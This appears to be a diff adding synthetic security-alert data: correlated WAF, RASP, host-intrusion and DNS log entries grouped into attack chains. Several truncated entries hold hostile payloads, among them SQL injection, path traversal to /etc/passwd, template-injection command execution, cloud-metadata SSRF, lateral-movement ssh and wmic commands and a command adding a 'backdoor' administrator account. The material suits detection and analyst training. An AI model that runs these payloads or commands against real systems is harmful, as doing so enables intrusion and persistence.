@@ -1,0 +1,113 @@
+1. `2026-05-08 02:07:56` **[waf]** `WAF0048744`
+    `/users/sign_in email=' OR '1'='1'--&password=x Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (K`
+2. `2026-05-08 02:07:58` **[rasp]** `RASP0053691`
+    `https://app-rails-38.ops-corp.com/users/sign_in {"mass_assignment": "{\"admin\":true}", "cmd": "email=' OR '1'`
+3. `2026-05-08 02:09:26` **[hids]** `HID0051195`
+    `ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.8.183 "id; hostname" ssh ssh -i /tmp/.key -o StrictHos`
+4. `2026-05-14 11:15:20` **[dns]** `DNS0098419`
+    `2fa0ad21.kpedpm-3d20.net A 203.0.113.35`
+5. `2026-05-14 11:17:40` **[dns]** `DNS0098427`
+    `5bf5926d.kpedpm-3d20.net A 10.10.27.205`
+6. `2026-05-14 11:18:00` **[dns]** `DNS0098430`
+    `ce266cce.kpedpm-3d20.net A 10.10.30.8`
+
+1. `2026-05-08 23:02:27` **[waf]** `WAF0054865`
+    `/public/plugins/alertlist/../../../etc/passwd this.constructor.constructor('return process')().mainModule.requ`
+2. `2026-05-08 23:02:29` **[rasp]** `RASP0060381`
+    `https://app-node-48.ops-corp.com/public/plugins/alertlist/../../../etc/passwd {"cmd": "url=http://169.254.169.`
+3. `2026-05-08 23:03:57` **[hids]** `HID0057463`
+    `ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.4.121 "id; hostname" ssh ssh -i /tmp/.key -o StrictHos`
+4. `2026-05-21 21:42:28` **[dns]** `DNS0153637`
+    `c02e3466.aodldd-7342.net A 10.10.39.10`
+5. `2026-05-21 21:43:48` **[dns]** `DNS0153645`
+    `ef6f2ba1.aodldd-7342.net A 203.0.113.15`
+6. `2026-05-21 21:44:08` **[dns]** `DNS0153648`
+    `276f6c85.aodldd-7342.net A 10.10.33.22`
+
+1. `2026-05-15 09:55:57` **[waf]** `WAF0099857`
+    `/cgi-bin/%%32%65%%32%65/bin/sh echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li`
+2. `2026-05-15 09:55:59` **[rasp]** `RASP0109943`
+    `https://app-php-98.ops-corp.com/cgi-bin/%%32%65%%32%65/bin/sh {"cmd": "echo;id"} Mozilla/5.0 (Windows NT 10.0;`
+3. `2026-05-15 09:57:27` **[hids]** `HID0106370`
+    `ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.6.196 "id; hostname" ssh ssh -i /tmp/.key -o StrictHos`
+4. `2026-05-23 07:43:50` **[dns]** `DNS0162416`
+    `307fe497.bpweeg-a867.net A 10.10.38.192`
+5. `2026-05-23 07:45:30` **[dns]** `DNS0162424`
+    `26c4e2c9.bpweeg-a867.net A 192.0.2.28`
+6. `2026-05-23 07:48:10` **[dns]** `DNS0162430`
+    `4f3f9a81.bpweeg-a867.net A 10.10.26.31`
+
+1. `2026-05-21 04:38:31` **[waf]** `WAF0139659`
+    `/webtools/control/main?deserialization=rO0ABXNyABFqYXZhLnV0aWw= cmd=id&ip=127.0.0.1+%26+id Mozilla/5.0 (Macint`
+2. `2026-05-21 04:38:33` **[rasp]** `RASP0154154`
+    `https://app-java-06.ops-corp.com/webtools/control/main?deserialization=rO0ABXNyABFqYXZhLnV0aWw= {"deserializat`
+3. `2026-05-21 04:40:01` **[hids]** `HID0149744`
+    `wmic /node:10.20.6.162 process call create "cmd.exe /c whoami" cmd.exe cmd.exe /c wmic /node:10.20.6.162 proce`
+4. `2026-05-24 05:38:43` **[dns]** `DNS0170988`
+    `500160ae.clmiyk-4791.net A 10.10.29.128`
+5. `2026-05-24 05:39:23` **[dns]** `DNS0170992`
+    `97049031.clmiyk-4791.net A 192.0.2.28`
+6. `2026-05-24 05:43:03` **[dns]** `DNS0171007`
+    `baa8b46e.clmiyk-4791.net A 10.10.41.218`
+
+1. `2026-05-24 05:32:13` **[waf]** `WAF0160558`
+    `/public/plugins/alertlist/../../../etc/passwd Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KH`
+2. `2026-05-24 05:32:15` **[rasp]** `RASP0177434`
+    `https://app-nginx-61.ops-corp.com/public/plugins/alertlist/../../../etc/passwd {"cmd": "/public/plugins/alertl`
+3. `2026-05-24 05:33:43` **[hids]** `HID0175426`
+    `ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.4.131 "id; hostname" ssh ssh -i /tmp/.key -o StrictHos`
+4. `2026-05-28 13:20:08` **[dns]** `DNS0202009`
+    `e34ce7aa.oedgsv-2e73.net A 10.10.42.223`
+5. `2026-05-28 13:20:28` **[dns]** `DNS0202010`
+    `0688a510.oedgsv-2e73.net A 192.0.2.156`
+6. `2026-05-28 13:22:48` **[dns]** `DNS0202023`
+    `10cf8b63.oedgsv-2e73.net A 10.10.29.50`
+
+1. `2026-05-02 13:05:39` **[rasp]** `RASP0011629`
+    `https://app-tomcat-51.ops-corp.com/api/json {"deserialization": "rO0ABXNyABFqYXZhLnV0aWw=", "cmd": "[\"com.sun`
+2. `2026-05-02 13:07:07` **[hids]** `HID0010328`
+    `net view /domain && net use \\10.20.10.44\C$ cmd.exe cmd.exe /c net view /domain && net use \\10.20.10.44\C$ <`
+3. `2026-05-06 20:50:25` **[dns]** `DNS0037390`
+    `b839c944.maoamz-a258.net A 10.10.23.157`
+4. `2026-05-06 20:51:45` **[dns]** `DNS0037399`
+    `818ef610.maoamz-a258.net A 203.0.113.220`
+5. `2026-05-06 20:54:05` **[dns]** `DNS0037417`
+    `9074af04.maoamz-a258.net A 10.10.31.102`
+
+1. `2026-05-21 02:14:10` **[waf]** `WAF0138972`
+    `/api/v1/render?template={{config.__class__.__init__.__globals__["os"].popen("id").read()}} data=rO0ABXNyABRqYX`
+2. `2026-05-21 02:15:40` **[hids]** `HID0148884`
+    `wmic /node:10.20.4.70 process call create "cmd.exe /c whoami" cmd.exe cmd.exe /c wmic /node:10.20.4.70 process`
+3. `2026-05-22 09:10:25` **[dns]** `DNS0156602`
+    `d01456ba.ozcmfk-dee3.net A 198.51.100.242`
+4. `2026-05-22 09:11:45` **[dns]** `DNS0156607`
+    `e7f798e3.ozcmfk-dee3.net A 10.10.37.111`
+5. `2026-05-22 09:13:05` **[dns]** `DNS0156615`
+    `2433fe1b.ozcmfk-dee3.net A 10.10.49.185`
+
+1. `2026-05-01 18:49:57` **[hids]** `HID0005461`
+    `ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.8.58 "id; hostname" ssh ssh -i /tmp/.key -o StrictHost`
+2. `2026-05-03 08:10:30` **[dns]** `DNS0014801`
+    `fe4c1054.sufees-c760.net A 10.10.29.210`
+3. `2026-05-03 08:10:50` **[dns]** `DNS0014802`
+    `a38fe443.sufees-c760.net A 203.0.113.136`
+4. `2026-05-03 08:13:10` **[dns]** `DNS0014810`
+    `80ae0f60.sufees-c760.net A 10.10.34.52`
+
+1. `2026-05-03 07:41:52` **[hids]** `HID0015425`
+    `wmic /node:10.20.6.49 process call create "cmd.exe /c net user /add backdoor 05449a53Aa1! && net localgroup ad`
+2. `2026-05-08 18:42:22` **[dns]** `DNS0051957`
+    `a797678e.krcszg-16ff.net A 10.10.37.173`
+3. `2026-05-08 18:45:42` **[dns]** `DNS0051974`
+    `c46a0242.krcszg-16ff.net A 10.10.43.124`
+4. `2026-05-08 18:47:02` **[dns]** `DNS0051978`
+    `3556fb77.krcszg-16ff.net A 192.0.2.85`
+
+1. `2026-05-02 23:18:24` **[hids]** `HID0012982`
+    `wmic /node:10.20.6.179 process call create "cmd.exe /c whoami" cmd.exe cmd.exe /c wmic /node:10.20.6.179 proce`
+2. `2026-05-09 15:42:06` **[dns]** `DNS0060612`
+    `ef78247d.marwul-3b1b.net A 10.10.35.154`
+3. `2026-05-09 15:42:46` **[dns]** `DNS0060617`
+    `a5c3a10e.marwul-3b1b.net A 198.51.100.22`
+4. `2026-05-09 15:44:26` **[dns]** `DNS0060626`
+    `10626cfa.marwul-3b1b.net A 10.10.44.12`
